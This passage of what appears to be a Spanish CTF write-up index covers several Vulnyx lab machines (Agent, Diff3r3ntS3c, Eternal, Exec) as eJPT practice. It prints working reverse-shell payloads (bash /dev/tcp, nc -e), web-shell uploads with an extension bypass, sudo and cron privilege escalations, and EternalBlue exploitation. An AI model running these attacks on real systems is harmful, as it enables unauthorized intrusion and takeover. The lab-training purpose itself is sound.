C:\\Users\\hope\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n\n*Evil-WinRM* PS C:\\temp&gt; type C:\\Users\\hope\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\nSet-LocalUser -Name \"administrator\" -Password (ConvertTo-SecureString \"SuperAdministrator123\" -AsPlainText -Force)\n\nevil-winrm -i 192.168.0.99 -u administrator -p SuperAdministrator123\n*Evil-WinRM* PS C:\\Users\\administrator\\desktop&gt; dir\n\n    Directorio: C:\\Users\\administrator\\desktop\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----          7/3/2024   9:43 PM             70 root.txt\n\n*Evil-WinRM* PS C:\\Users\\administrator\\desktop&gt; type root.txt\nfe*************************b81\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Admin/#_1","title":"Admin","text":""},{"location":"Writeup-ctfs/Vulnyx/Agent/","title":"Agent","text":"<p>\ud83e\udde0 Plataforma: Vulnyx</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Very Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 5 de abril de 2025 15:41</p> <p>\ud83c\udf10 IP: <code>192.168.0.214</code></p>"},{"location":"Writeup-ctfs/Vulnyx/Agent/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Identificamos el equipo por la MAC 08:00 perteneciente a VirtualBox</p> <p>Identificamos sistema operativo y vemos que por ttl, corresponde a Linux</p> <pre><code>whichSystem.py 192.168.0.214                                                                                                                               \n\n    192.168.0.214 (ttl -&gt; 64): Linux\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Agent/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.214 -oG targeted\n\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 64\n80/tcp open  http    syn-ack ttl 64\nMAC Address: 08:00:27:7C:C8:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Agent/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>nmap -p22,80 -sCV 192.168.0.214 -oN targeted\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)\n| ssh-hostkey: \n|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)\n|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)\n80/tcp open  http    nginx 1.22.1\n|_http-title: Welcome to nginx!\n|_http-server-header: nginx/1.22.1\nMAC Address: 08:00:27:7C:C8:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades<ul> <li>22 SSH</li> <li>80 HTTP (nginx)</li> </ul> </li> </ul> <p>Analizamos la web y vemos la pagina de bienvenida de Nginx</p> <p>Vamos a realizar fuzzing para ver si encontramos informaci\u00f3n relacionada con el servidor web:</p> <pre><code>dirb http://192.168.0.214                                                                                                       \ue0b2 \u2714 \ue0b3 15:52:44 \uf017 \ue0b0\n\n-----------------\nDIRB v2.22    \nBy The Dark Raver\n-----------------\n\nSTART_TIME: Sat Apr  5 15:52:55 2025\nURL_BASE: http://192.168.0.214/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n-----------------\n\nGENERATED WORDS: 4612                                                          \n\n---- Scanning URL: http://192.168.0.214/ ----\n+ http://192.168.0.214/index.html (CODE:200|SIZE:615)                                                                                                                                    \n==&gt; DIRECTORY: http://192.168.0.214/websvn/                                                                                                                                              \n\n---- Entering directory: http://192.168.0.214/websvn/ ----\n==&gt; DIRECTORY: http://192.168.0.214/websvn/cache/                                                                                                                                        \n==&gt; DIRECTORY: http://192.168.0.214/websvn/include/                                                                                                                                      \n+ http://192.168.0.214/websvn/index.php (CODE:302|SIZE:0)                                                                                                                                \n==&gt; DIRECTORY: http://192.168.0.214/websvn/javascript/                                                                                                                                   \n==&gt; DIRECTORY: http://192.168.0.214/websvn/languages/                                                                                                                                    \n==&gt; DIRECTORY: http://192.168.0.214/websvn/templates/                                                                                                                                    \n\n---- Entering directory: http://192.168.0.214/websvn/cache/ ----\n+ http://192.168.0.214/websvn/cache/tmp (CODE:200|SIZE:72)                                                                                                                               \n\n---- Entering directory: http://192.168.0.214/websvn/include/ ----\n+ http://192.168.0.214/websvn/include/header (CODE:200|SIZE:856)                                                                                                                         \n\n---- Entering directory: http://192.168.0.214/websvn/javascript/ ----\n\n---- Entering directory: http://192.168.0.214/websvn/languages/ ----\n\n---- Entering directory: http://192.168.0.214/websvn/templates/ ----\n</code></pre> <p>Encontramos la ruta : / websv</p> <p></p> <p>Vemos que hace alusi\u00f3n a </p> <ul> <li>WebSVN 2.6.0</li> <li>Apache Subversion 1.14.2</li> </ul> <p>Buscamos si hay vulnerabilidades disponibles</p> <pre><code>searchsploit websvn 2.6.0\nWebsvn 2.6.0 - Remote Code Execution (Unauthenticated)  | php/webapps/50042.py\n</code></pre> <p>Revisamos el exploit y modificamos la parte del PAYLOAD para que la revershell apunte a nuestra maquina:</p> <pre><code>PAYLOAD = \"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.0.115/4444 0&gt;&amp;1'\u201d\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Agent/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/Vulnyx/Agent/#exploit-50042","title":"Exploit 50042","text":"<p>Nos ponemos en escucha con netcat y ejecutamos el exploit para recibir la revershell</p> <pre><code>sudo python3 50042.py http://192.168.0.214/websvn \n[*] Request send. Did you get what you wanted?\n</code></pre> <p>Recibimos la revershell y hacemos tratamiento de la TTY</p> <pre><code>nc -lvnp 444\nwww-data@agent:~/html/websvn$ script -c bash /dev/null\nctrZ\nstty raw -echo; fg\nreset xterm\n\nwww-data@agent:~/html/websvn$ export TERM=XTERM\nwww-data@agent:~/html/websvn$ export SHELL=BASH\n\nwww-data@agent:~/html/websvn$ \n</code></pre> <p>A continuaci\u00f3n listamos que permsios tenemos</p> <pre><code>sudo -l \nMatching Defaults entries for www-data on agent:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser www-data may run the following commands on agent:\n    (dustin) NOPASSWD: /usr/bin/c99\n</code></pre> <p>Vemos que aparece un usuario llamado \u201cdustin\u201d y que podemos usar el binario c99 con permisos de root</p>"},{"location":"Writeup-ctfs/Vulnyx/Agent/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"<p>Buscamos en GTFObins y encontramos:</p> <pre><code>SUDO C99\nsudo c99 -wrapper /bin/sh,-s .\n</code></pre> <pre><code>www-data@agent:/tmp$ cd /usr/bin/\nwww-data@agent:/usr/bin$ sudo -u dustin c99 -wrapper /bin/sh,-s .\n$ whoami\ndustin\n</code></pre> <p>Ahora, listamos que permisos tenemos con este usuario y encontramos:</p> <pre><code>$ sudo -l\nMatching Defaults entries for dustin on agent:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser dustin may run the following commands on agent:\n    (root) NOPASSWD: /usr/bin/ssh-agent\n$ \n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Agent/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Buscamos de nuevo el binario ssh-agent en GTFObins</p> <pre><code>sudo ssh-agent /bin/\n</code></pre> <p>Explotamos el binario</p> <pre><code>$ whoami\ndustin\n$ sudo ssh-agent /bin/sh\n# whoami\nroot\n$ cd /home/dustin\n$ ls\nuser.txt\n$ cd /root\n$ ls\nroot.txt\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Diff3r3ntS3c/","title":"Diff3r3ntS3c","text":"<p>\ud83e\udde0 Plataforma: Vulnyx</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 30 de abril de 2025 23:53</p> <p>\ud83c\udf10 IP: <code>192.168.0.236</code></p>"},{"location":"Writeup-ctfs/Vulnyx/Diff3r3ntS3c/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Identificamos los dispositivos de la red mediante arp-scan</p> <pre><code>sudo arp-scan -I eth0 --localnet                                                                                          \ue0b2 1 \u2718 \ue0b3 23:59:00 \uf017 \ue0b0\nInterface: eth0, type: EN10MB, \nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n\n192.168.0.236   08:00:27:29:77:d1   PCS Systemtechnik GmbH\n</code></pre> <p>Localizamos la maquina v\u00edctima por el identificador de la MAC, que al empezar por 08:00 nos indica que pertenece al proveedor VirtualBox</p>"},{"location":"Writeup-ctfs/Vulnyx/Diff3r3ntS3c/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.236 -oG targeted\n\nPORT   STATE SERVICE REASON\n80/tcp open  http    syn-ack ttl 64\nMAC Address: 08:00:27:29:77:D1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Diff3r3ntS3c/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>sudo nmap -p80 -sCV 192.168.0.236 -oN targted\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.57 ((Debian))\n|_http-title: Diff3r3ntS3c\n|_http-server-header: Apache/2.4.57 (Debian)\nMAC Address: 08:00:27:29:77:D1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades<ul> <li>80 Apache httpd 2.4.57</li> </ul> </li> </ul> <p>Enumeramos el servidor web</p> <p>Miramos mediante whatweb o wapalizer que tecnologias usa la web</p> <pre><code>whatweb http:\\\\192.168.0.236\nhttp://192.168.0.236 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[192.168.0.236], JQuery, Script, Title[Diff3r3ntS3c]\n</code></pre> <p>Revisamos el sitio web y vemos un apartado en donde se pueden subir ficheros</p> <p></p> <p>Antes de seguir este vector de ataque, investigamos mediante fuzzing si hay directorios donde subir los ficheros</p> <pre><code>dirb http:\\\\192.168.0.236\n==&gt; DIRECTORY: http://192.168.0.236/uploads/  \n</code></pre> <p>Una vez hemos encontrado el directorio uploads, procedemos a tratar de subir una revershell para entablar conexi\u00f3n con la maquina victima</p> <p>Usaremos la webshell ubicada en :</p> <pre><code> cp /usr/share/webshells/php/php-reverse-shell.php ../content/shell.php  \n</code></pre> <p></p>"},{"location":"Writeup-ctfs/Vulnyx/Diff3r3ntS3c/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/Vulnyx/Diff3r3ntS3c/#revershell","title":"ReverShell","text":"<p>Al tratar de subir la revershell obtenemos el mensaje siguiente :</p> <pre><code>http://192.168.0.236/uploadData.php\nThis file looks malicious. Please do not try to hack us.\n</code></pre> <p>Vamos a probar de bypassear el control de contenido. Cambiamos la extensi\u00f3n del archivo y obtenemos el mensaje:</p> <pre><code>cp shell.php6 shell.phtml \nThe file shell.php.doc has been uploaded\n</code></pre> <p>Accedemos al enlace de descargas que hemos localizado anteriormente y obtenemos la revershell</p> <pre><code>nc -lvnp 4444\nhttp:\\\\192.168.0.236\\uploads\\1\\shell.phtml\n\nlistening on [any] 4444 ...\nconnect to [192.168.0.115] from (UNKNOWN) [192.168.0.236] 52048\nLinux Diff3r3ntS3c 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux\n 00:26:09 up 30 min,  0 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=1000(candidate) gid=1000(candidate) groups=1000(candidate)\n/bin/sh: 0: can't access tty; job control turned off\n$ \n</code></pre> <p>Hacemos tratamiento de la TTY</p> <pre><code>$ script -c bash /dev/null\ncandidate@Diff3r3ntS3c:/$ \nctr+z\nstty raw echo; fg\nreset xterm\ncandidate@Diff3r3ntS3c:/$ \ncandidate@Diff3r3ntS3c:/home/candidate$ cat user.txt \n9b*********************e8d\ncandidate@Diff3r3ntS3c:/home/candidate$ \n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Diff3r3ntS3c/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Vamos a tratar de escalar privilegios desde el usuario candidate hasta root.</p> <p>Probamos a listar permisos mediante sudo y ficheros con capacidad de escritura , y encontramos un archivo interesante</p> <pre><code>candidate@Diff3r3ntS3c:/home/candidate$ sudo -l\nbash: sudo: command not found\n\ncandidate@Diff3r3ntS3c:/home/candidate$ find / -type f -perm -u=w 2&gt;/dev/null\n/home/candidate/.scripts/makeBackup.sh\ncandidate@Diff3r3ntS3c:/home/candidate$ cat makeBackup.sh \n\n#!/bin/bash\n\n# Source folder to be backed up\nsource_folder=\"/var/www/html/uploads/\"\n\n# Destination folder for the backup\nbackup_folder=\"/home/candidate/.backups/\"\n\n# Create backup folder if it doesn't exist\nmkdir -p \"$backup_folder\"\n\n# Backup file name\nbackup_file=\"${backup_folder}backup.tar.gz\"\n\n# Create a compressed tar archive of the source folder\ntar -czf \"$backup_file\" -C \"$source_folder\" .\n\ncandidate@Diff3r3ntS3c:/home/candidate/.scripts$ \n</code></pre> <p>Vemos que se trata de un script para realizar un backup del contenido de la carpeta uploads.</p> <p>Buscamos donde se puede estar usando este script y vemos se usa en una tarea programada (cron)</p> <pre><code>candidate@Diff3r3ntS3c:/home/candidate/.scripts$ grep -rl \"makeBackup.sh\" /etc /home /opt /var /usr /root 2&gt;/dev/null\n/etc/crontab\n\ncandidate@Diff3r3ntS3c:/home/candidate/.scripts$ cat /etc/cron*\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# Example of job definition:\n# .---------------- minute (0 - 59)\n# |  .------------- hour (0 - 23)\n# |  |  .---------- day of month (1 - 31)\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n# |  |  |  |  |\n# *  *  *  *  * user-name command to be executed\n17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || { cd / &amp;&amp; run-parts --report /etc/cron.daily; }\n47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / &amp;&amp; run-parts --report /etc/cron.weekly; }\n52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / &amp;&amp; run-parts --report /etc/cron.monthly; }\n#\n* * * * * root /bin/sh /home/candidate/.scripts/makeBackup.sh\n</code></pre> <p>Como tenemos permisos para editar el fichero, cambiamos el contenido para que nos ejecute una shell con permisos de root</p> <pre><code>candidate@Diff3r3ntS3c:/home/candidate/.scripts$ nano makeBackup.sh\nnc 192.168.0.115 4433 -e /bin/bash  \n# alternativa si no esta disponible nc\n/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.115/4433 0&gt;&amp;1\n\nnc -lvnp 4433                                                                                                              \ue0b2 \u2714 \ue0b3 01:09:51 \uf017 \ue0b0\nlistening on [any] 4433 ...\nconnect to [192.168.0.115] from (UNKNOWN) [192.168.0.236] 50606\nwhoami\nroot\nscript -c bash /dev/null\nScript iniciado, el fichero de anotaci\u00f3n de salida es '/dev/null'.\nroot@Diff3r3ntS3c:~# \nroot@Diff3r3ntS3c:~# cat root.txt\ncat root.txt\n2********************da\nroot@Diff3r3ntS3c:~# \n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Diff3r3ntS3c/#_1","title":"Diff3r3ntS3c","text":""},{"location":"Writeup-ctfs/Vulnyx/Eternal/","title":"Eternal","text":"<p>\ud83e\udde0 Plataforma: Vulnyx</p> <p>\ud83d\udcbb Sistema operativo: Windows</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 15 de marzo de 2025 0:38</p> <p>\ud83c\udf10 IP: <code>192.168.0.12</code></p>"},{"location":"Writeup-ctfs/Vulnyx/Eternal/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <pre><code>sudo arp-scan -I eth0 --localnet\n\n192.168.0.12    08:00:27:7d:c6:d4   PCS Systemtechnik GmbH\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Eternal/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv &lt;IP&gt; -oG allports\nPORT      STATE SERVICE      REASON\n135/tcp   open  msrpc        syn-ack ttl 128\n139/tcp   open  netbios-ssn  syn-ack ttl 128\n445/tcp   open  microsoft-ds syn-ack ttl 128\n5357/tcp  open  wsdapi       syn-ack ttl 128\n49152/tcp open  unknown      syn-ack ttl 128\n49153/tcp open  unknown      syn-ack ttl 128\n49154/tcp open  unknown      syn-ack ttl 128\n49155/tcp open  unknown      syn-ack ttl 128\n49156/tcp open  unknown      syn-ack ttl 128\n49157/tcp open  unknown      syn-ack ttl 128\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Eternal/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>sudo nmap -p135,139,445,5357,49152,49153,49154,49155,49156,49157 -sCV 192.168.0.12 -oN targeted\n\nPORT      STATE SERVICE      VERSION\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Windows 7 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Service Unavailable\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49152/tcp open  msrpc        Microsoft Windows RPC\n49153/tcp open  msrpc        Microsoft Windows RPC\n49154/tcp open  msrpc        Microsoft Windows RPC\n49155/tcp open  msrpc        Microsoft Windows RPC\n49156/tcp open  msrpc        Microsoft Windows RPC\n49157/tcp open  msrpc        Microsoft Windows RPC\nMAC Address: 08:00:27:7D:C6:D4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -19m59s, deviation: 34m38s, median: 0s\n|_nbstat: NetBIOS name: MIKE-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:7d:c6:d4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled but not required\n| smb-os-discovery: \n|   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1\n|   Computer name: MIKE-PC\n|   NetBIOS computer name: MIKE-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2025-03-15T00:45:05+01:00\n| smb2-time: \n|   date: 2025-03-14T23:45:05\n|_  start_date: 2025-03-14T23:39:37\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades</li> </ul> <pre><code>nmap --script \"safe or smb-enum-*\" -p 445 192.168.0.12 -oX smb_enum.xml\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\nsmb-vuln-ms17-010: \nVULNERABLE:\n\nsmb-os-discovery: \n|   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1\n|   Computer name: MIKE-PC\n|   NetBIOS computer name: MIKE-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2025-03-15T00:47:40+01:00\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Eternal/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/Vulnyx/Eternal/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Como vemos que es vulnerable a ms17-010</p> <pre><code>msf6 &gt; search ms17-010\nmsf6 &gt; exploit(windows/smb/ms17_010_eternalblue) \nmsf6 &gt; setg RHOSTS 192.168.0.12\nmsf6 &gt; run\nmeterpreter&gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter&gt; shell\nC:\\Users\\MIKE&gt;cd desktop\nC:\\Users\\MIKE\\Desktop&gt;dir\ndir\n El volumen de la unidad C no tiene etiqueta.\n El n\ufffdmero de serie del volumen es: 44FD-46F4\n\n Directorio de C:\\Users\\MIKE\\Desktop\n\n03/02/2024  12:50    &lt;DIR&gt;          .\n03/02/2024  12:50    &lt;DIR&gt;          ..\n03/02/2024  12:50                35 root.txt\n03/02/2024  12:50                35 user.txt\n               2 archivos             70 bytes\n               2 dirs  24.078.188.544 bytes libres\n\nC:\\Users\\MIKE\\Desktop&gt;\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Eternal/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Al acceder como NTAUHORITY\\SYSTEM con metasploit , no hace falta elevar privilegios</p>"},{"location":"Writeup-ctfs/Vulnyx/Eternal/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina realizada para preparar la EJPT"},{"location":"Writeup-ctfs/Vulnyx/Exec/","title":"Exec","text":"<p>\ud83e\udde0 Plataforma: Vulnyx</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 6 de abril de 2025 20:42</p> <p>\ud83c\udf10 IP: <code>192.168.0.187</code></p>"},{"location":"Writeup-ctfs/Vulnyx/Exec/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Identificamos la maquina por la MAC perteneciente al fabricante VirtualBox (empieza por 08:00)</p> <pre><code> whichSystem.py 192.168.0.187                                                                                                          \n    192.168.0.187 (ttl -&gt; 64): Linux\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Exec/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.187-oG all_ports\n\nPORT    STATE SERVICE      REASON\n22/tcp  open  ssh          syn-ack ttl 64\n80/tcp  open  http         syn-ack ttl 64\n139/tcp open  netbios-ssn  syn-ack ttl 64\n445/tcp open  microsoft-ds syn-ack ttl 64\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Exec/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code> sudo nmap -p22,80,139,445 -sCV 192.168.0.187 -oN targeted  \n\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\n| ssh-hostkey: \n|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)\n|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)\n80/tcp  open  http        Apache httpd 2.4.57 ((Debian))\n|_http-title: Apache2 Debian Default Page: It works\n|_http-server-header: Apache/2.4.57 (Debian)\n139/tcp open  netbios-ssn Samba smbd 4\n445/tcp open  netbios-ssn Samba smbd 4\nMAC Address: 08:00:27:4D:01:E3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: -2s\n| smb2-time: \n|   date: 2025-04-06T18:46:31\n|_  start_date: N/A\n|_nbstat: NetBIOS name: EXEC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades<ul> <li>22 OpenSSH 9.2p1</li> <li>80 Apche httpd 2.4.57</li> <li>445/139 SMB</li> </ul> </li> </ul> <p>Al tener abiertos los puertos 445/139 procedemos a enumerar el servicio SMB</p> <p>Probamos a establecer una conexion remota anonima</p> <pre><code>smbclient -L 192.168.0.187  \nPassword: anonymous\n\nSharename       Type      Comment\n    ---------       ----      -------\n    print$          Disk      Printer Drivers\n    server          Disk      Developer Directory\n    IPC$            IPC       IPC Service (Samba 4.17.12-Debian)\n    nobody          Disk      Home Directories\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Exec/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/Vulnyx/Exec/#smbclient","title":"SMBClient","text":"<p>Mediante el uso de SMBClient , tratamos de conectar al recurso sin credencia</p> <pre><code>smbclient //192.168.0.187/server -N\nsmb: \\&gt; ls\n  .                                   D        0  Sun Apr  6 22:58:58 2025\n  ..                                  D        0  Mon Apr 15 10:04:12 2024\n  index.html                          N    10701  Mon Apr 15 10:04:31 2024\n\n        19480400 blocks of size 1024. 16400548 blocks available\n</code></pre> <p>Vemos que el acceso es posible y observamos que estamos en la raiz del servidor que aloja la pagina web (apache)</p> <p>Tratamos de subir una rever shell para ejecutarla desde la web</p> <p>Usamos la revershell de PentestMonkey como shell.php</p> <pre><code>nano shell.php \n\nsmb: \\&gt; put shell.php\nsmb: \\&gt; ls\n  .                                   D        0  Sun Apr  6 23:05:16 2025\n  ..                                  D        0  Mon Apr 15 10:04:12 2024\n  shell.php                           A     2587  Sun Apr  6 23:05:16 2025\n  index.html                          N    10701  Mon Apr 15 10:04:31 2024\n</code></pre> <p>Nos ponemos en escucha para recibir la revershell</p> <pre><code>nc -lvnp 4444\n</code></pre> <p>Accedemos al servidor web y ejecutamos</p> <pre><code>http:\\\\192.168.0.187\\shell.php\n</code></pre> <p>Obtenemos acceso y hacemos tratamiento de la TTY</p> <pre><code>www-data@exec:/$\ncntrZ\nstty raw -echo; fg\n    reset xterm\nwww-data@exec:/$ export SHELL = BASH\nwww-data@exec:/$ export TERM = XTERM\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Exec/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Accedemos con las credenciales encontradas   <p>Una vez dentro, listamos los permisos del usuario</p> <pre><code>sudo -l\nMatching Defaults entries for www-data on exec:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser www-data may run the following commands on exec:\n    (s3cur4) NOPASSWD: /usr/bin/bash\n</code></pre> <p>Vemos que podemos convertirnos en el usuario s3cur4 ejecutandouna bash sin requerir permisos</p> <pre><code>www-data@exec:/$ sudo -u s3cur4 /usr/bin/bash\ns3cur4@exec:/$ \n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Exec/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Ahora vamos a listar los permisos del usuario s3cur4</p> <pre><code>s3cur4@exec:/$ sudo -l\nMatching Defaults entries for s3cur4 on exec:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    